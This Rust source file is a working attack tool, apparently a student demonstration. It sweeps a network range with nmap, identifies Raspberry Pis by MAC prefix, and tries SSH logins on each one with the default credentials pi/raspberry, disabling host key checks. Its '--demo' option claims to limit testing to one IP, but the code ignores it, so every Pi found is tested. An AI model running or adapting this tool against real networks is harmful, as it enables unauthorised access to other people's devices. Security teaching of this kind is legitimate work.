use clap::Parser;
use std::process::{Command,Stdio};
use colored::*;
use std::io::Write;

static DEFAULT_USERNAME: &str = "pi";
static DEFAULT_PASSWORD: &str = "raspberry";

#[derive(Parser)]
///Search a network for raspberry PI's and try default credentials with an ssh connection. This is a QUT student demonstration of a password spray attack. 
struct Cli {

    #[clap(short, long)]
    ///Specify an ip range to scan. E.g. 192.0.0-255.0-255 or 192.0.0.0-255
    network_range: String,
    
    #[clap(short, long)]
    ///Specify an IP to target. Other IP's will be scanned but not tested against
    demo: Option<String>,

}

fn check_external_dependencies() {
    //Dependencies: nmap, sshpass (linux only), putty (windows only)
    if cfg!(target_os = "linux") {
        let nmap = Command::new("which")
                            .arg("nmap")
                            .output()
                            .expect("which failed to start. Attempted to run 'which nmap'");
        if(nmap.status.success() == false) {
            println!("{}{}", "nmap is not installed or cannot be found! Install it here: ".bright_red().bold(), "https://nmap.org/download".green());
            panic!("Dependencies not found!");
        }
        let sshpass = Command::new("which")
                            .arg("sshpass")
                            .output()
                            .expect("which failed to start. Attempted to run 'which sshpass'");
        if(sshpass.status.success() == false) {
            println!("{}{}", "sshpass is not installed or cannot be found! Install it here: ".bright_red().bold(), "https://github.com/kevinburke/sshpass".green());
            panic!("Dependencies not found!");
        }
    } else if cfg!(target_os = "windows") {
        let nmap = Command::new("where")
                            .arg("nmap")
                            .output()
                            .expect("where failed to start. Attempted to run 'where nmap'");
        if(nmap.status.success() == false) {
            println!("{}{}", "nmap is not installed or cannot be found! Install it here: ".bright_red().bold(), "https://nmap.org/download".green());
            panic!("Dependencies not found!");
        }

        let sshpass = Command::new("where")
                            .arg("putty")
                            .output()
                            .expect("where failed to start. Attempted to run 'where putty'");
        if(sshpass.status.success() == false) {
            println!("{}{}", "putty is not installed or cannot be found! Install it here: ".bright_red().bold(), "https://www.putty.org/".green());
            panic!("Dependencies not found!");
        }
    } else {
        panic!("This program is only compatible with Linux and Windows");
    }
}

fn get_ips(network_range: String) -> Vec<String> {
    let mut ips = Vec::new();
    let pi_macaddr = ["B8:27:EB", "28:CD:C1", "DC:A6:32", "E4:5F:01"];
    println!("{}", "Scanning...".green());
    let nmap_scan = Command::new("nmap")
                            .arg("-sn")
                            .arg(network_range)
                            .output()
                            .expect("nmap failed to start, check that it's installed. https://nmap.org/download");
    
    let nmap_output = String::from_utf8_lossy(&nmap_scan.stdout);

    let mut count = 0;
    for line in nmap_output.lines() {
        for macaddr in pi_macaddr {
            if line.contains(macaddr) {
               println!("{}", line.bright_green());
               ips.push(String::from(&nmap_output.lines().nth(count - 2).unwrap()[21..]));
            }
        }
        count += 1;
    }

    println!("Found {} raspberry pi's", ips.len().to_string().red());
    return ips;
}

#[cfg(target_os = "linux")]
fn spray(ips: Vec<String>) {
    for ip in ips {
        print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
        let ssh = Command::new("sshpass")
                      .arg("-p")
                      .arg(DEFAULT_PASSWORD)
                      .arg("ssh")
                      .arg("-o")
                      .arg("StrictHostKeyChecking no")
                      .arg(format!("{}@{}", DEFAULT_USERNAME,  ip))
                      .arg("whoami")
                      .output()
                      .expect("Tried to run 'sshpass -p DEFAULT_PASSWORD ssh -o 'StrictHostKeyChecking no' DEFAULT_USERNAME@IP whoami' but failed.");
        
        let ssh_output = String::from_utf8_lossy(&ssh.stdout);
        if (ssh_output.contains(DEFAULT_USERNAME)){
            println!("[{}] {}", "+".bright_green(), ip);
        } else {
            println!("[{}] {}", "-".bright_red(), ip);
        }
    }
}

#[cfg(target_os = "windows")]
fn spray(ips: Vec<String>) {

    let mut file = std::fs::File::create("whoami.txt").expect("Failed to file for splink");
    file.write_all("whoami".as_bytes()).expect("Failed to write to file for splink");

    for ip in ips {
        print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
        let ssh = Command::new("plink")
                        .arg("-ssh")
                        .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
                        .arg("-pw")
                        .arg(DEFAULT_PASSWORD)
                        .arg("-m")
                        .arg("whoami.txt")
                        .output()
                        .expect("ssh failed to start");
        let ssh_output = String::from_utf8_lossy(&ssh.stdout);
        if (ssh_output.contains(DEFAULT_USERNAME)){
            println!("[{}] {}", "+".bright_green(), ip);
        } else {
            println!("[{}] {}", "-".bright_red(), ip);
        }
    }

    std::fs::remove_file("whoami.txt").expect("Failed to delete file used for splink. Please delete it from your directory.");
}

fn main() {
    check_external_dependencies();
    let args = Cli::parse();
    let ips = get_ips(args.network_range);
    spray(ips);
}

